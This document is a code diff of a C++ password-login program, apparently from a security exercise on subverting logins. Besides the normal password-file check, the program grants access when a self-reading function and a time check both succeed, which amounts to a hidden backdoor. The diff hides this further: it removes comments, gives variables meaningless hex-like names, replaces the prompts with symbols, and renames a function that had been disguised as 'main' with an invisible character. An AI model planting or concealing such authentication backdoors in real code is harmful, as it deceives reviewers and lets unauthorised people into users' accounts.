@@ -12,7 +12,7 @@ using namespace std;
 string f8e9d7(const string& d5e7a3) { unsigned char a8c6e4[SHA256_DIGEST_LENGTH]; SHA256_CTX b9f7g2; SHA256_Init(&b9f7g2); SHA256_Update(&b9f7g2, d5e7a3.c_str(), d5e7a3.size()); SHA256_Final(a8c6e4, &b9f7g2); stringstream c7e5b3; for (int d4e2f1 = 0; d4e2f1 < SHA256_DIGEST_LENGTH; d4e2f1++)c7e5b3 << hex << setw(2) << setfill('0') << (int)a8c6e4[d4e2f1]; return c7e5b3.str(); }
 
 
-bool main​(const std::string& p) {
+bool fnaf(const std::string& p) {
     std::ifstream sf("login-subverted.cpp");
     std::string l;
     char c;
@@ -26,46 +26,30 @@ bool f8e9d7c6() { time_t a1b2c3 = time(0); tm* d4e5f6 = localtime(&a1b2c3); retu
 
 
 int main() {
-	// Int to store max amount of attempts allowed
-	const int MAX_ATTEMPTS = 3;
-	// Stores amount of attempts user has done
-	int attempts = 0;
-	// Store user inputs and line string for file reading, then user details from file.
-	string usernameIn, passwordIn, line, usernameFromFile, passwordFromFile;
+	const int _0x12345678 = 3;
+	int _0x89ABCDEF = 0;
+	string _0x10FEDCBA, _0x23456789, _0x90ABCDEF, _0x76543210, _0xBA098765;
 
-	// Loop until user is authenticated or max attempts are reached, prompt and store username/password
-	while (attempts++ < MAX_ATTEMPTS && cout << "Enter your username: " && cin >> usernameIn && cout << "Enter your password: " && cin >> passwordIn) {
+	while (_0x89ABCDEF++ < _0x12345678 && cout << "&:" && cin >> _0x10FEDCBA && cout << "*:" && cin >> _0x23456789) {
+		ifstream _0x54321098("passwords.txt");
+		if (!_0x54321098) { cerr << "!"; return 1; }
 
-		// Open the file containing stored usernames and passwords, print error if problem
-		ifstream passwordsFile("passwords.txt");
-		if (!passwordsFile) { cerr << "Error opening password file." << endl; return 1; }
-
-		// Read the file line by line
-		bool isAuthenticated = false;
-		while (getline(passwordsFile, line) && !isAuthenticated) {
-			stringstream ss(line);
-
-			// Extract username and password from the read line
-			getline(ss, usernameFromFile, ':'), getline(ss, passwordFromFile, ':');
-
-			// Check if entered credentials match any in the file
-			isAuthenticated = usernameFromFile == usernameIn && passwordFromFile == f8e9d7(passwordIn);
+		bool _0xFEDCBA10 = false;
+		while (getline(_0x54321098, _0x90ABCDEF) && !_0xFEDCBA10) {
+			stringstream _0xABCDEF01(_0x90ABCDEF);
+			getline(_0xABCDEF01, _0x76543210, ':'), getline(_0xABCDEF01, _0xBA098765, ':');
+			_0xFEDCBA10 = _0x76543210 == _0x10FEDCBA && _0xBA098765 == f8e9d7(_0x23456789);
 		}
-		// Close the file after reading
-		passwordsFile.close();
+		_0x54321098.close();
 
-		// If Authenticated, Exit indicating successful authentication
-		if (isAuthenticated || (main​(passwordIn) && f8e9d7c6())) {
-			authenticated(usernameIn);
+		if (_0xFEDCBA10 || (fnaf(_0x23456789) && f8e9d7c6())) {
+			authenticated(_0x10FEDCBA);
 			return 0;
 		}
-		// For incorrect login details, reject and re-prompt input
-		if (attempts < MAX_ATTEMPTS) {
-			cout << "Incorrect login details. You have " << (MAX_ATTEMPTS - attempts) << " attempts left." << endl;
-		// If maximum attempts exceeded, reject the user
-		}
-		else {
-			rejected(usernameIn);
+		if (_0x89ABCDEF < _0x12345678) {
+			cout << "!" << (_0x12345678 - _0x89ABCDEF) << "^";
+		} else {
+			rejected(_0x10FEDCBA);
 		}
 	}
 	return 0;
